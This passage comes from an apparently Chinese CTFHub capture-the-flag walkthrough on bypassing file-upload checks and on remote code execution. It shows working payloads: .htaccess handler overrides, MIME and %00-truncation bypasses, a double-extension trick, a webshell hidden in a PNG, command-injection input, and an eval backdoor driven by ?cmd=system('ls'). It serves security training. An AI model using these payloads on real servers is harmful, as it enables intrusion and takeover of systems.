以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。</p><p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>简单来说，就是我上传了一个.htaccess文件到服务器，那么服务器之后就会将<strong>我想要的特定格式的文件</strong>以php格式解析。</p><p>先看下源码（上传限制没有.htaccess）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/11.png" alt=""></p><p>这里有两种编写.htaccess文件的方法</p><p>1.当请求的文件名后缀是&quot;hacker&quot;时，服务器会用PHP解释器来处理这个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">&lt;FilesMatch <span class="string">&quot;hacker&quot;</span>&gt;开始了一个匹配文件的条件。它告诉Apache服务器，只有当请求的文件名匹配到<span class="string">&quot;hacker&quot;</span>时，才应用接下来的配置。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在&lt;FilesMatch&gt;标签内部，SetHandler application/x-httpd-php是配置指令。SetHandler指令用于设置处理请求的程序或模块。在这个例子中，它告诉Apache服务器，当文件名匹配到<span class="string">&quot;hacker&quot;</span>时，使用PHP解释器来处理这个文件。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">application/x-httpd-php是PHP解释器的MIME类型，它告诉服务器要使用PHP来解析和执行文件。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">最后，&lt;/FilesMatch&gt;结束了文件匹配的条件，之后的配置指令将不再受此条件约束。</span></span><br><span class="line"></span><br><span class="line">&lt;FilesMatch &quot;hacker&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>2.使该.htaccess文件所在目录及其子目录中的后缀为.jpg的文件被Apache当做php文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">AddType application/x-httpd-php .jpg是一个配置指令，用于设置文件的MIME类型。MIME类型是一种用于描述文件内容的标准，它告诉服务器如何处理特定的文件。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">application/x-httpd-php是PHP解释器的MIME类型。这意味着当Apache服务器接收到一个请求，并且请求的文件是.jpg时，它将尝试使用PHP解释器来处理这个文件。</span></span><br><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>先上传.htaccess</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/12.png" alt=""></p><p>后上传php文件就行了（记得改你用的方案的后缀）+蚁剑</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/13.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/15.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/16.png" alt=""></p><p>不过提一嘴这个文件不是允许访问的</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/14.png" alt=""></p><h5 id="4-MIME绕过">4.MIME绕过</h5><p><a href="https://www.cnblogs.com/klb561/p/10090540.html">Http请求中Content-Type</a></p><p>MIME(（Multipurpose Internet Mail Extensions）多用途互联网邮件扩展类型。</p><p>它是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</p><p>多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式每个MIME类型由两部分组成，前面是数据的大类别，例如声音 audio、图象 Image等,后面定义具体的种类。</p><p>常见的MME类型，例如：</p><p>超文本标记语言文本 .html,html text/htm</p><p>普通文本  .txt text/plain</p><p>RTF文本. rtf application/rtf</p><p>GIF图形 .gif image/gif</p><p>JPEG图形 . jpg image/jpeg</p><p>MIME类型校验就是我们在上传文件到服务端的时候，服务端会对客户端也就是我们上传的文件的Content-Type类型进行检测，如果是白名单所允许的，则可以正常上传，否则上传失败。</p><p>先看源码，没有发现限制</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/17.png" alt=""></p><p>上传的时候我直接上传1.php是失败的，但是我尝试上传2.png没有报错</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/18.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/19.png" alt=""></p><p>说明<code>image/gif</code>是在白名单的</p><p>使用burp，上传1.php并且看看格式是<code>application/octet-stream ： 二进制流数据（如常见的文件下载）</code>,修改成<code>image/gif</code>,上传成功</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/21.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/22.png" alt=""></p><p>老样子+蚁剑</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/23.png" alt=""></p><blockquote><p>值得一提的是</p><p>第一次上传2.jpg虽然成功，但是我在访问文件地址看到报错。上传1.php成功，而且访问页面成功，所以我在这里猜测MIME只管在上传文件到服务端的时候，尽管Content-Type修改成<code>image/gif</code>，但是服务器在识别文件的时候还是看后缀来编译（个人猜测，请大佬指正）</p></blockquote><h5 id="5-00截断">5.00截断</h5><p>0x00 ， %00 ， /00 之类的截断，都是一样的，只是不同表示而已。</p><p>在url中 %00 表示ascll码中的 0 ，而ascii中0作为特殊字符保留，是字符串的结束标识符，所以当url中出现%00时就会认为读取已结束。</p><p>攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。</p><p><strong>00截断的限制条件：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP&lt;5.3.29，且GPC关闭</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">5.3.4及以上已经修复该问题</span></span><br></pre></td></tr></table></figure><p>数据包中必须含有<strong>上传后文件的目录情况</strong>才可以用，比如数据包中存在path: uploads/，那么攻击者可以通过修改path的值来构造paylod: uploads/1.php%00</p><blockquote><p>那么我们为什么要这样构造呢？<br>服务器上传的时候读取文件是从右向左读取，相反Apache服务是从左向右读取文件的</p></blockquote><p>先试1.php老样子不行，再试1.png成功开始截断</p><p>这里我试了很多次，发现不管上传1.php还是1.png只要你在filename后面写的时候用png就行了，在第一行POST路径上写<code>*.php%00.png</code>，可以换成其他名字（其实就是重命名），我直接放结果</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/29.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/28.png" alt=""></p><p>值得注意的是蚁剑添加数据的url不能直接用，因为他显示的是具体路径(var/www/…)，但其实只能通过/upload访问，比如说/upload/3.php</p><p>这个才是蚁剑需要填入的url</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/30.png" alt=""></p><p>最后是关于几个问答</p><p>1.我们为什么不可以直接改文件名为：<code>1.php%00png</code>呢？</p><p>先分析源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="variable">$info</span>[<span class="string">&#x27;extension&#x27;</span>];                <span class="comment">//首先取到上传文件的扩展名$ext</span></span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>);   <span class="comment">//将扩展名与白名单进行匹配，为jpg、png或gif才能通过第一次过滤</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="variable">$des</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>) . <span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span>;   <span class="comment">//扩展名匹配之后，为上传的文件构造了一个新的存储路径$des</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$des</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件类型不匹配&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据代码可知：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="variable">$des</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>) . <span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span>; </span><br><span class="line"><span class="comment"># 该路径基于GET参数&quot;road&quot;、一个随机数、当前日期时间和一个扩展名。</span></span><br></pre></td></tr></table></figure><p>当我们上传文件之后，会移动我们上传文件的路径到$des中，而$des是前面的路经和随机数以及字符串拼接所称的路径，但我们蚁剑连接需要确切的路径，因此修改文件名00截断不可行！<br>由于我们上传的文件就是png格式的，那么直接在/?road=/var/www/html/upload/后（burp第一行）构造1.php%00,这里的%00就是为了和我们上传文件的类型png进行截断！</p><p>2.为什么会有随机字符串的png文件</p><p>那是我上传的png文件，但是在服务器端被修改名字了</p><p>因此在POST参数road进行截断，也就是第一行，可以避免上述情况</p><p>因此尽管我上传的是php文件，用%00修改了filename=“1.png%002.png”，上传能够成功，但是因为没有修改第一行只会生成随机的****.png</p><p>参考资料：</p><p>大佬对原理分析得很清楚<a href="http://www.admintony.com/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90.html">关于上传中的00截断分析</a></p><p><a href="https://www.cnblogs.com/0yst3r-2046/p/12511617.html">CTFHub题解-技能树-Web-文件上传（.htaccess、MIME绕过、文件头检查）【二】 - 0yst3r - 博客园 (cnblogs.com)</a></p><h5 id="6-双写后缀">6.双写后缀</h5><p>老样子先上传1.php，肯定不。。。。欸，上传成功了？？？</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/32.png" alt=""></p><p>开心太早了，一看上传的文件没有了后缀php</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/33.png" alt=""></p><p>打开f12看一下源码，发现有一行注释，大概意思就是检测文件后缀有没有出现在黑名单里面，如果有的话替换成’'即空字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="variable">$_FILES</span>超全局数组中获取上传文件的名字。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]存储了上传文件的原始名称。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">basename</span>()函数用于返回路径中的文件名部分，确保我们只获取文件名而不是完整的路径。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="variable">$blacklist</span> 是黑名单数组</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用str_ireplace()函数，这行代码将文件名中与黑名单中的任何扩展名匹配的部分替换为空字符串（即删除它们）。str_ireplace()是不区分大小写的，这意味着它会同时匹配大写和小写字母。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">name = <span class="built_in">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">blacklist = array(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;aspx&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;ashx&quot;</span>, <span class="string">&quot;asmx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">name = str_ireplace(<span class="variable">$blacklist</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$name</span>);</span></span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/34.png" alt=""></p><blockquote><p>str_ireplace()只会替换第一次出现的匹配项</p></blockquote><p>这意味着我们只需要把后缀名改成 <code>pphphp</code>就行了</p><p>即</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.ctfhub.com:10800/upload/shell.    #上传文件名：shell.php</span><br><span class="line"> </span><br><span class="line">http://xxx.ctfhub.com:10800/upload/shell.php    #上传文件名：shell.pphphp</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/35.png" alt=""></p><p>看上传的文件果然如此</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/36.png" alt=""></p><h5 id="7-文件头检查">7.文件头检查</h5><p>先试试1.php，提心只能上传<code>jpeg</code> <code>jpg</code> <code>png</code> <code>gif</code>类型文件</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/37.png" alt=""></p><p>这里我还是先尝试修改MIME绕过</p><p>这里先用burp抓下包，修改成<code>Content-Type:image/png</code>,果不其然还是提示文件类型不正确，那么就是头部问题了</p><p><a href="https://www.cnblogs.com/senior-engineer/p/9541719.html#:~:text=%E5%9C%A8%E6%AF%8F%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%88%E5%8C%85,%E5%B0%B1%E6%98%AF%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A0%87%E5%BF%97%E3%80%82">利用文件头标志判断文件类型</a></p><blockquote><p>文件的扩展名是用来识别文件类型的。通过给他指定扩展名，我们可以告诉自己，也告诉操作系统我们想用什么方式打开这个文件。比如我么会把.jpg的文件默认用图片显示软件打开，.zip 文件会默认用解压软件打开等等。</p><p>然而，扩展名完全是可以随便改改的。我们可以给文件设置一个任意的扩展名，当然也可以不设置扩展名。这样一来我们就不能了解到这个文件究竟是做什么的，究竟是个什么样的文件。我们或许也会疑惑，为什么一个软件，比如视频播放器，就能用正确的方式打开.mp4 .rmvb .wmv 等等的视频？</p><p>事实上，所有的文件都是以二进制的形式进行存储的，本质上没有差别。之所以使用的方法不同，只是因为我们理解他的方式不同。在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）实际上都有一片区域来显示这个文件的实际用法，这就是文件头标志。</p></blockquote><p>简单来说就是不同类型的文件的二进制下，开头的二进制是用来表示文件的类型的</p><p>比如说png的头部是89 50 4E 47 0D 0A</p><p>所以这题可以为了方便可以找一张png图片（尽量小，好像大了的话有限制还是上传不了？）我是截了一张很小的图，然后用记事本打开最后添加一句话小马就行</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/38.png" alt=""></p><p>当然也要MIME绕过，看下抓的包</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/39.png" alt=""></p><p>上传成功</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/40.png" alt=""></p><p>然后用蚁剑就行了</p><p>看下文件的样子（原来会变成这样😮）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/files%20upload/41.png" alt=""></p><h4 id="6-RCE">6.RCE</h4><h5 id="0-介绍">0.介绍</h5><p><a href="https://blog.csdn.net/qq_43814486/article/details/90020139">初学RCE（远程命令/代码执行漏洞）-CSDN博客</a></p><p>RCE（Remote Code Execution）即远程代码执行漏洞，一句话来说就是：</p><p>可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><p>RCE分为远程命令执行ping和远程代码执行evel。</p><h6 id="1-原理">1.原理</h6><p><strong>远程系统命令执行</strong></p><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、<a href="https://cloud.tencent.com/product/cwp?from_column=20065&amp;from=20065">入侵检测</a>等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 现在很多的甲方企业都开始实施自动化<a href="https://cloud.tencent.com/solution/operation?from_column=20065&amp;from=20065">运维</a>,大量的系统操作会通过&quot;自动化运维平台&quot;进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。</p><p><strong>远程代码执行</strong></p><p>同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p><p>我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。具体后端代码如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">result.=shell_exec(<span class="string">&#x27;ping &#x27;</span>.<span class="variable">$ip</span>);<span class="comment">#直接将变量拼接进来，没做处理</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">比如说有一个空填ip</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">本来我只填 baidu.com</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">但是我知道漏洞填入 baidu.com&amp;net start</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">相当于直接操控服务器电脑的cmd命令行！高危漏洞！</span></span><br></pre></td></tr></table></figure><h6 id="2-常见RCE漏洞函数">2.常见RCE漏洞函数</h6><p>1.系统命令执行函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">system()：# 能将字符串作为OS命令执行，且返回命令执行结果；</span><br><span class="line"></span><br><span class="line">exec()：# 能将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)；</span><br><span class="line"></span><br><span class="line">shell_exec()：# 能将字符串作为OS命令执行</span><br><span class="line"></span><br><span class="line">passthru()：# 能将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；</span><br><span class="line"></span><br><span class="line">popen()：# 打开进程文件指针</span><br><span class="line"></span><br><span class="line">proc_open()：# 与popen()类似</span><br><span class="line"></span><br><span class="line">pcntl_exec()：# 在当前进程空间执行指定程序；</span><br><span class="line"></span><br><span class="line">``：# 反引号``内的字符串会被解析为OS命令；</span><br></pre></td></tr></table></figure><p>2.代码执行函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">eval()：# 将字符串作为php代码执行；</span><br><span class="line"></span><br><span class="line">assert()：# 将字符串作为php代码执行；</span><br><span class="line"></span><br><span class="line">preg_replace()：# 正则匹配替换字符串；</span><br><span class="line"></span><br><span class="line">create_function()：# 主要创建匿名函数；</span><br><span class="line"></span><br><span class="line">call_user_func()：# 回调函数，第一个参数为函数名，第二个参数为函数的参数；</span><br><span class="line"></span><br><span class="line">call_user_func_array()：# 回调函数，第一个参数为函数名，第二个参数为函数参数的数组；</span><br><span class="line"></span><br><span class="line">可变函数：若变量后有括号，该变量会被当做函数名为变量值(前提是该变量值是存在的函数名)的函数执行；</span><br></pre></td></tr></table></figure><h6 id="3-管道符">3.管道符</h6><p><strong>Windows系统</strong>支持的管道符如下：</p><table><thead><tr><th style="text-align:left">管道符</th><th style="text-align:center">实例</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">|</td><td style="text-align:center">A|B</td><td style="text-align:left">直接执行后面的语句</td></tr><tr><td style="text-align:left">||</td><td style="text-align:center">A||B</td><td style="text-align:left">如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。</td></tr><tr><td style="text-align:left">&amp;</td><td style="text-align:center">A&amp;B</td><td style="text-align:left">两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。</td></tr><tr><td style="text-align:left">&amp;&amp;</td><td style="text-align:center">A&amp;&amp;B</td><td style="text-align:left">如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</td></tr></tbody></table><p><strong>Linux系统</strong>支持的管道符如下：</p><table><thead><tr><th style="text-align:left">管道符</th><th>实例</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">;</td><td>A;B</td><td style="text-align:left">无论真假，A与B都执行</td></tr><tr><td style="text-align:left">&amp;</td><td>A&amp;B</td><td style="text-align:left">无论真假，A与B都执行</td></tr><tr><td style="text-align:left">&amp;&amp;</td><td>A&amp;&amp;B</td><td style="text-align:left">A为真时才执行B，否则只执行A</td></tr><tr><td style="text-align:left">|</td><td>A|B</td><td style="text-align:left">显示B的执行结果</td></tr><tr><td style="text-align:left">||</td><td>A||B</td><td style="text-align:left">A为假时才执行B，否则只执行A</td></tr></tbody></table><h6 id="4-挖到这个漏洞能做什么">4. 挖到这个漏洞能做什么</h6><ul><li>远程命令、代码执行（单凭这一点能做的事情就不少，如下）</li><li>获取敏感数据、文件、服务器信息</li><li>写入恶意文件Getshell</li></ul><p>参考文献</p><p><a href="https://cloud.tencent.com/developer/article/1668900">【原创】基础篇 – RCE漏洞总结-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p><a href="https://blog.csdn.net/m0_73185293/article/details/131557169">RCE漏洞详解及绕过总结(全面)-CSDN博客</a></p><h5 id="1-eval执行">1.eval执行</h5><p>打开靶场发现只有代码,先分析一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    eval($_REQUEST[&quot;cmd&quot;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><blockquote><ol><li><p>__isset判断一个变量是否已设置, 即变量已被声明，且其值为ture</p><p>如果 <code>$_REQUEST['cmd']</code> 存在（即用户通过某种方式，如GET或POST请求，发送了一个名为 ‘cmd’ 的参数），则执行 <code>eval($_REQUEST[&quot;cmd&quot;]);</code>。<code>eval()</code> 函数在 PHP 中用于执行一个或多个字符串作为 PHP 代码。</p></li><li><p>如果 <code>$_REQUEST['cmd']</code> 不存在，则执行 <code>highlight_file(__FILE__);</code>。<code>highlight_file()</code> 函数会输出一个 PHP 文件并高亮其中的 PHP 代码。<code>__FILE__</code> 是一个魔术常量，它返回当前文件的完整路径和文件名。如果这段代码被保存为 <code>example.php</code>，那么 <code>__FILE__</code> 的值就是 <code>'example.php'</code>。因此，这段代码会显示当前文件的源代码，并高亮其中的 PHP 代码。</p></li></ol></blockquote><p>总之：如果用户发送了一个 ‘cmd’ 参数，服务器会执行该参数中的 PHP 代码；否则，服务器会显示当前文件的源代码。</p><p>所以我们有两种方式</p><h6 id="1-修改URL">1.修改URL</h6><p>所以我们在访问的时候使用变量 cmd，在网址url后面添加<code>?cmd=system('ls');</code>查看当前目录</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/1.png" alt=""></p><p>然后利用<code>../</code>查看上一级目录，以此类推，可以看到flag</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/2.png" alt=""></p><p>找到flag用<code>cat</code>获取文件内容</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/3.png" alt=""></p><h6 id="2-蚁剑">2.蚁剑</h6><p>这里其实相当于已经把木马传给了服务器，我们直接用蚁剑连就行了，注意密码是<code>cmd</code></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/4.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/RCE/5.png" alt=""></p><p>同样也能找到flag</p><h5 id="2-文件包含">2.文件包含</h5><p>还是老样子分析给出的代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 